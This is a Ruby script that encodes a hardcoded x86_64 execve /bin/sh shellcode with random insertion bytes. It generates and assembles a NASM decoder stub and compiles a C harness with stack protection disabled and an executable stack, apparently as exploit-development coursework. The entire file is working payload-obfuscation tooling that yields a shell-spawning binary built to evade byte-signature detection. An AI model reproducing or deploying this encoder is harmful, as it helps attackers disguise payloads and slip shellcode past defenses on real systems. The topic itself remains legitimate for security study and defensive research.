#!/usr/bin/ruby -w
 
# Generates encoded shellcode
#
# @param shellcode [String Array] shellcode in hex byte format 
# @param randominsertbytes [String Array] hex bytes to randomly insert into shellcode
# @param endbytemarker [String] end byte marker 
# @return [String] shellcode that has been encoded
def generate_encoded_shellcode(shellcode, randominsertbytes, endbytemarker)
  puts "[*] Generate random insertion encoded shellcode..."
  encoded_shellcode = ""
 
  # created encoded shellcode, make sure that all of the 
  # original shellcode is included in the string.
  shellcode_index = 0
  while shellcode_index <= shellcode.length do
    if rand(1..1000) > 500
      encoded_shellcode += randominsertbytes[rand(0..randominsertbytes.length-1)]
    else
      if shellcode_index <= shellcode.length
        encoded_shellcode += "#{shellcode[shellcode_index]}"
      end
      shellcode_index += 1
    end
    encoded_shellcode += ","
  end
     
  return "#{encoded_shellcode.chop}#{endbytemarker}"
end
 
# Generates an x86_64 assembly language source file
# which will decode and execute the encoded shellcode
#
# @param encodedshellcode [String] encoded shellcode
# @param randominsertbytes [String Array] hex bytes to randomly insert into shellcode
# @param endbytemarker [String] end byte marker 
# @param filename [String] name of assembly language source file
def generate_asm_code(encodedshellcode, randominsertbytes, endbytemarker, filename)
  puts "[*] Generate assembly language for encoded shellcode..."
   
  filename = filename + ".asm"
     
  asmcode_header = [
    "global _start",
    "section .text", 
    "_start:", 
    "    jmp short call_shellcode",
    "decoder:",
    "    pop rsi",
    "    lea rdi, [rsi]",
    "    xor rax, rax",
    "    xor rbx, rbx",
    "decode:",
    "    mov bl, byte [rsi + rax]"
  ]
 
  asmcode_decode = []   
    randominsertbytes.each do |x|
    asmcode_decode << "    cmp bl, #{x}"
    asmcode_decode << "    jz  insertionByte"
  end
 
  asmcode_footer = [
    "    cmp bl, #{endbytemarker}",
    "    jz  short encodedShellcode",
    "    mov byte [rdi], bl",
    "    inc rdi",
    "    inc rax",
    "    jmp short decode",
    "insertionByte:",
    "    inc rax",
    "    jmp decode",
    "call_shellcode:",
    "    call decoder",
    "    encodedShellcode db #{encodedshellcode}"
  ]
 
  final_asmcode = []
  final_asmcode << asmcode_header 
  final_asmcode << asmcode_decode 
  final_asmcode << asmcode_footer 
 
  File.open(filename, "w+") do |asmsourcefile|
    asmsourcefile.puts(final_asmcode)
  end
 
  puts "[*] Finished writing assembly language source code to #{filename}."
end
 
# Create executable binary from assembly language source file
#
# @param filename [String] filename of assembly executable
# @return [Integer] status of shell operation
def build_assembly_executable(filename)
  puts "[*] Building assembly executable, #{filename}..."
 
  exit_status = 0
     
  Open3.popen3("nasm -felf64 -o #{filename}.o #{filename}.asm") { |i,o,e,t|
    exit_status = t.value
  }
     
  Open3.popen3("ld -o #{filename} #{filename}.o") { |i,o,e,t|
    exit_status = t.value
  }
     
  return exit_status
end
 
# Extract shellcode from executable file using a shell command
#
# @param filename [String] filename of assembly executable
# @param cmd [String] command to execute from shell
# @return [String] shellcode extracted from assembly executable
def extract_shellcode_from_binary(filename, cmd)
  puts "[*] Extracting shellcode from executable file, #{filename}..."
 
  extracted_shellcode = ""
   
  Open3.popen3("./#{cmd} #{filename}") { |i,o,e,t|
    extracted_shellcode = o.gets(nil)
  }
 
  return extracted_shellcode
end
 
# Build c language shellcode template, insert encodedshellcode
#
# @param cfilename [String] C source filename
# @param encodedshellcode [String] shellcode extracted from assembly executable
def generate_shellcode_template(cfilename, encodedshellcode)
  puts "[*] Generating shellcode template C source file..."
     
  cfilename += ".c"

  ctemplate = [
    "#include <stdio.h>",
    "",
    "unsigned char code[] = \"#{encodedshellcode}\";".gsub("\n",""),
    "",
    "main()",
    "{",
    "    int (*ret)() = (int(*)())code;",
    "    ret();",
    "}"
  ]
 
  File.open(cfilename, "w+") do |csourcefile|
    csourcefile.puts(ctemplate)
  end
end
 
# Compile generated C source file
# 
# @param cfilename [String] c executable filename
# @return [Integer] status of shell operation
def build_shellcode_binary(cfilename)
  puts "[*] Building shellcode binary (#{cfilename})..."
     
  exit_status = 0
  Open3.popen3 ("gcc -fno-stack-protector -z execstack -ggdb -o #{cfilename} #{cfilename}.c") do |i,o,e,t|    
    exit_status = t.value
  end
 
  return exit_status
end
 
# Instruct user on program status and next step
#
# @param cfilename [String] c executable filename
def test_shellcode(cfilename)
  puts "[*] Finished!"
  puts "\n./#{cfilename} to test, /bin/sh on success... (Good luck!)\n\n"
end
 
# required modules
require "open3"
 
# variables for shellcode generation
asmfilename = "encodedshellcode"
cfilename = "shellcode"
# execve 64bit shellcode
shellcode = %w(0x48 0x31 0xff 0x57 0x57 0x5e 0x5a 0x48 0xbf 0x2f 0x2f 0x62 0x69 0x6e 0x2f 0x73 0x68 0x48 0xc1 0xef 0x08 0x57 0x54 0x5f 0x6a 0x3b 0x58 0x0f 0x05)
# make sure bytes are valid x86_64 one byte opcodes
random_insert_bytes = %w(0x9b 0xcb 0xf5 0xfc 0xc3)
end_byte = "0xbb"
extract_shellcode_cmd = "extract_shellcode.sh"
 
# main 
encoded_shellcode = generate_encoded_shellcode(shellcode, random_insert_bytes, end_byte)  
generate_asm_code(encoded_shellcode, random_insert_bytes, end_byte, asmfilename)
build_assembly_executable(asmfilename)
extracted_shellcode = extract_shellcode_from_binary(asmfilename, extract_shellcode_cmd)
generate_shellcode_template(cfilename, extracted_shellcode)
build_shellcode_binary(cfilename)
test_shellcode(cfilename)
